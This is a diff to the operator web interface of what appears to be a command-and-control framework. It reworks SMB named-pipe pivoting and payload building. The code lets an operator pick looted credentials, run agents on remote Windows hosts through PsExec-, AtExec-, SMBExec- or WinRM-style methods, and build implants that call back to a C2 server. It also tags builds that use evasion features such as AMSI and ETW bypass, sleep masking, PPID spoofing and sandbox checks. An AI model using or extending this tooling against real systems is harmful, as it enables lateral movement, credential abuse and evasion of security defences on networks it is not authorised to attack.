@@ -299,7 +299,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 .upload-zone:hover,.upload-zone.drag{border-color:var(--accent);color:var(--accent)}
 .upload-zone input[type=file]{display:none}
 /* ── Context menu ── */
-#ctx-menu{position:fixed;z-index:9999;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:4px 0;min-width:200px;box-shadow:0 6px 24px rgba(0,0,0,.7);display:none;pointer-events:auto}
+#ctx-menu{position:fixed;z-index:9999;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:4px 0;min-width:200px;max-height:calc(100vh - 8px);overflow-y:auto;overscroll-behavior:contain;box-shadow:0 6px 24px rgba(0,0,0,.7);display:none;pointer-events:auto}
 #ctx-menu.open{display:block}
 .ctx-item{padding:5px 14px 5px 12px;font-size:12px;cursor:pointer;color:var(--text);white-space:nowrap;display:flex;align-items:center;gap:7px;user-select:none;position:relative}
 .ctx-item:hover{background:rgba(0,212,255,.1);color:var(--accent)}
@@ -309,7 +309,7 @@ input[type=checkbox]{accent-color:var(--accent);cursor:pointer}
 .ctx-item.has-sub{padding-right:22px}
 .ctx-item.has-sub::after{content:'▸';position:absolute;right:9px;opacity:.5;font-size:10px}
 .ctx-item.has-sub:hover::after{opacity:1}
-.ctx-submenu{position:absolute;left:100%;top:-4px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:4px 0;min-width:200px;box-shadow:0 6px 24px rgba(0,0,0,.7);display:none;z-index:10001;pointer-events:auto}
+.ctx-submenu{position:absolute;left:100%;top:-4px;background:var(--bg3);border:1px solid var(--border2);border-radius:5px;padding:4px 0;min-width:200px;max-height:calc(100vh - 8px);overflow-y:auto;overscroll-behavior:contain;box-shadow:0 6px 24px rgba(0,0,0,.7);display:none;z-index:10001;pointer-events:auto}
 .ctx-item.has-sub:hover>.ctx-submenu{display:block}
 /* quick form floating panel */
 #ctx-quick-form{position:fixed;z-index:10002;background:var(--bg3);border:1px solid var(--border2);border-radius:7px;padding:14px 16px;min-width:270px;max-width:320px;box-shadow:0 8px 32px rgba(0,0,0,.8);display:none}
@@ -3838,7 +3838,7 @@ async function runCtxAction(act) {
       const uploadFiles = (uploadR?.ok ? uploadR.data||[] : []).filter(f => f.filename?.match(/\.(exe|bin)$/i) && !f.agent_id);
       // Deduplicate uploads against artifacts (artifacts take priority)
       const artifactNames = new Set(artifacts.map(f => f.filename));
-      const payloadGroup = artifacts.map(f=>({v:f.filename,l:f.filename}))
+      const payloadGroup = artifacts.map(f=>({v:f.filename,l:`${f.filename}${f.opsec ? ' · OPSEC' : ''}${f.lang ? ` · ${f.lang}` : ''}`}))
         .concat(uploadFiles.filter(f => !artifactNames.has(f.filename) && isAgentPayloadFilename(f.filename)).map(f=>({v:f.filename,l:f.filename})));
 
       const isWinRM = method.startsWith('winrm');
@@ -3918,36 +3918,47 @@ async function runCtxAction(act) {
         {v:'atexec',  l:'AtExec (Task Scheduler)'},
         {v:'smbexec', l:'SMBExec (in-memory)'},
       ];
-      // Load existing SMB pivot payloads for re-use
+      // Only reuse artifacts with explicit SMB metadata tied to this parent.
+      // Filename conventions are not sufficient: an OPSEC HTTP payload cannot
+      // act as an SMB-pipe pivot, and a pipe payload is bound to its parent.
       const artifactsR = await api('GET', '/api/artifacts');
+      const pipeNameFromPath = p => String(p||'').replace(/[\\/]+$/,'').split(/[\\/]/).pop();
+      const pivotMeta = new Map();
       const existingPivots = (artifactsR?.ok ? artifactsR.data||[] : [])
-        .filter(f => f.filename?.toLowerCase().endsWith('.exe') && (/smb|pipe/i.test(f.filename) || /^svc_/i.test(f.filename)))
-        .map(f => ({v:f.filename, l:f.filename}));
+        .filter(f => /\.exe$/i.test(f.filename||'') && f.transport === 'smb' && f.smb_pipe && f.parent_ip === parentIP)
+        .map(f => {
+          pivotMeta.set(f.filename, f);
+          return {v:f.filename, l:`${f.filename}${f.opsec ? ' · OPSEC' : ''}${f.lang ? ` · ${f.lang}` : ''}`};
+        });
       const payloadOptions = [{v:'', l:'🆕 Build new (auto)'}, ...existingPivots];
 
       showQuickForm('🔗 SMB Pipe Pivot', [
-        {key:'host',    label:'Target host / IP', def:'', ph:'10.10.10.x'},
-        {key:'_cred',   label:'Loot credentials', type:'cred-pick'},
+        {key:'parent',  label:'Parent / pipe server', readonly:true, def:parentIP},
+        {key:'host',    label:'Target hostname or IP', def:'', ph:'10.10.10.22'},
+        {key:'_cred',   label:'Loot credentials (fills fields)', type:'cred-pick'},
         {key:'user',    label:'Username',          def:'', ph:'DOMAIN\\user'},
         {key:'pass',    label:'Password',          type:'password', ph:''},
-        {key:'method',  label:'Staging method',    type:'select', options:pivotMethods},
-        {key:'payload', label:'Payload (SMB pivot exe)', type:'select', options:payloadOptions},
+        {key:'method',  label:'Remote execution method', type:'select', options:pivotMethods},
+        {key:'payload', label:'Agent payload (SMB pipe)', type:'select', options:payloadOptions},
       ], async vals => {
         if (!vals.host) { toast('Host required', 'red'); return; }
 
         // Generate unique pipe name so each pivot gets its own channel
         const pipeSuffix = Math.random().toString(16).slice(2, 8);
         const pipeName   = `svc_${pipeSuffix}`;
-        // If user picked an existing payload, derive the pipe name from the filename stem.
-        // The payload was built with that pipe name baked in (e.g. svc_p2.exe → svc_p2).
+        // A reused payload carries the exact pipe path in its metadata. Never
+        // reconstruct it from the filename: custom output names are allowed.
         let effectivePipeName = pipeName;
         let effectiveOutName  = `${pipeName}.exe`;
         const existingPayload = vals.payload;  // '' means build new
+        let pipeUNC = `\\\\${parentIP}\\pipe\\${effectivePipeName}`;
         if (existingPayload) {
-          effectivePipeName = existingPayload.replace(/\.exe$/i, '');
+          const selected = pivotMeta.get(existingPayload);
+          if (!selected) { toast('Selected payload has no valid SMB metadata', 'red'); return; }
+          effectivePipeName = pipeNameFromPath(selected.smb_pipe);
           effectiveOutName  = existingPayload;
+          pipeUNC = selected.smb_pipe;
         }
-        const pipeUNC   = `\\\\${parentIP}\\pipe\\${effectivePipeName}`;
         const c2host    = c2IPs[0] || (() => { try { return new URL(BASE).hostname; } catch(e) { return '127.0.0.1'; } })();
         const serverURL = `http://${c2host}:8080`;
 
@@ -3964,7 +3975,7 @@ async function runCtxAction(act) {
           tasks.push(api('POST', '/api/build', {
             lang: preferredLang('smb', agnt?.language), format:'exe', transport:'smb',
             smb_pipe: pipeUNC, server_url: serverURL,
-            sleep_sec:5, jitter_pct:10, output_name: effectiveOutName,
+            sleep_sec:5, jitter_pct:10, parent_id: aid, parent_ip: parentIP, output_name: effectiveOutName,
           }));
         }
         const results = await Promise.all(tasks);
@@ -4081,7 +4092,7 @@ async function runCtxAction(act) {
             {v:'', l:'🆕 Build new (auto)'},
             {v:'self', l:'♻️ Reusar binario actual (self) — sin escritura a disco'},
           ]
-          .concat(artifacts.map(f=>({v:f.filename, l:`${f.filename}  (${fmtDate(f.created_at)})`})))
+          .concat(artifacts.map(f=>({v:f.filename, l:`${f.filename}${f.opsec ? ' · OPSEC' : ''}${f.lang ? ` · ${f.lang}` : ''}  (${fmtDate(f.created_at)})`})))
           .concat(uploadFiles.filter(f=>!artifactNames.has(f.filename) && isAgentPayloadFilename(f.filename)).map(f=>({v:f.filename,l:f.filename})));
 
         showQuickForm('🚀 Spawn Agent as User — local RunAs', [
@@ -4125,8 +4136,8 @@ async function runCtxAction(act) {
                   lang: preferredLang('smb', agnt?.language), format:'exe', transport:'smb',
                   smb_pipe: pipeUNC, server_url: srvURL,
                   sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
-                  parent_id: aid,
-                  output_name: outName,
+              parent_id: aid, parent_ip: host,
+              output_name: outName,
                 }),
               ]);
               if (!pipeR?.ok) {
@@ -4153,7 +4164,7 @@ async function runCtxAction(act) {
               const buildR = await api('POST', '/api/build', {
                 lang: preferredLang(transport, agnt?.language), format:'exe', transport, server_url: serverURL,
                 sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
-                parent_id: aid,
+                parent_id: aid, parent_ip: host,
                 output_name: outName,
               });
               if (!buildR?.ok) {
@@ -11793,6 +11804,23 @@ function toggleBuildOpt(optId, cb) {
   if (el) el.classList.toggle('build-opt-on', cb.checked);
 }
 
+function buildUsesOpsec() {
+  const value = id => document.getElementById(id)?.value?.trim() || '';
+  const checked = id => !!document.getElementById(id)?.checked;
+  return !!(
+    value('pay-killdate') || value('pay-hours') || value('pay-inject') ||
+    (value('pay-sleepmask') && value('pay-sleepmask') !== 'none') ||
+    (value('pay-amsimethod') && value('pay-amsimethod') !== 'none') ||
+    value('pay-ppidspoof') || value('pay-sacrificial') ||
+    Number(value('pay-maxretry')) > 0 || Number(value('pay-dripchunk')) > 0 ||
+    Number(value('pay-dripdelay')) > 0 || value('pay-gr-ip') ||
+    value('pay-gr-user') || value('pay-gr-host') || value('pay-gr-domain') ||
+    value('pay-postexpipe') || checked('pay-etwbypass') || checked('pay-stackspoof') ||
+    checked('pay-transformobf') || checked('pay-covertraffic') || checked('pay-sandbox') ||
+    checked('pay-entropy') || checked('pay-stageclean')
+  );
+}
+
 function opsecSelectCheck(selectEl, badgeId) {
   const opt = selectEl.options[selectEl.selectedIndex];
   const on = !!(opt && opt.dataset.opsec === 'true');
@@ -12294,6 +12322,7 @@ async function buildPayload() {
     sleep_sec:    parseInt(document.getElementById('pay-sleep').value)  || 60,
     jitter_pct:   parseInt(document.getElementById('pay-jitter').value) || 20,
     arch:         document.getElementById('pay-arch').value || 'amd64',
+    opsec:        buildUsesOpsec(),
     // OPSEC
     kill_date:      document.getElementById('pay-killdate').value || '',
     working_hours:  document.getElementById('pay-hours').value.trim()   || '',
